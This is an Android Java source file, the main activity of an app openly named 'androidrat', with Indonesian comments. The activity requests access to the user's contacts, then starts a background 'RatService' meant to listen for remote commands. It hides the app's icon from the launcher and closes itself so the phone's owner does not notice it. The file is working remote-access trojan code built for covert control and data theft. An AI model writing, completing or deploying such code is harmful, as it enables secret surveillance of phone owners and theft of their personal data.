package com.example.androidrat;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "AndroidRAT";
    private static final int PERMISSIONS_REQUEST_CODE = 123;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "RAT Main Activity Started.");

        // Minta izin yang diperlukan saat runtime
        requestPermissionsIfNeeded();
    }

    private void requestPermissionsIfNeeded() {
        String[] permissions = {
                Manifest.permission.READ_CONTACTS
                // Tambahkan izin lain di sini jika perlu
        };

        if (!hasPermissions(permissions)) {
            Log.d(TAG, "Meminta izin yang diperlukan.");
            ActivityCompat.requestPermissions(this, permissions, PERMISSIONS_REQUEST_CODE);
        } else {
            Log.d(TAG, "Semua izin sudah diberikan.");
            startRatFunctionality();
        }
    }

    private boolean hasPermissions(String... permissions) {
        if (permissions != null) {
            for (String permission : permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSIONS_REQUEST_CODE) {
            // Cek apakah semua izin yang diminta telah diberikan
            boolean allGranted = true;
            for (int grantResult : grantResults) {
                if (grantResult != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (allGranted) {
                Log.d(TAG, "Izin diberikan oleh pengguna.");
                startRatFunctionality();
            } else {
                Log.d(TAG, "Satu atau lebih izin ditolak oleh pengguna. Menutup activity.");
                finish(); // Tutup jika izin tidak diberikan
            }
        }
    }

    private void startRatFunctionality() {
        // 1. Mulai service di background untuk mendengarkan perintah
        Log.d(TAG, "Memulai RatService.");
        Intent serviceIntent = new Intent(this, RatService.class);
        try {
            startService(serviceIntent);
        } catch (Exception e) {
            Log.e(TAG, "Gagal memulai service: ", e);
        }

        // 2. Sembunyikan ikon aplikasi dari launcher
        Log.d(TAG, "Menyembunyikan ikon aplikasi.");
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

        // 3. Tutup activity agar tidak terlihat oleh pengguna
        Log.d(TAG, "Menutup MainActivity.");
        finish();
    }
}
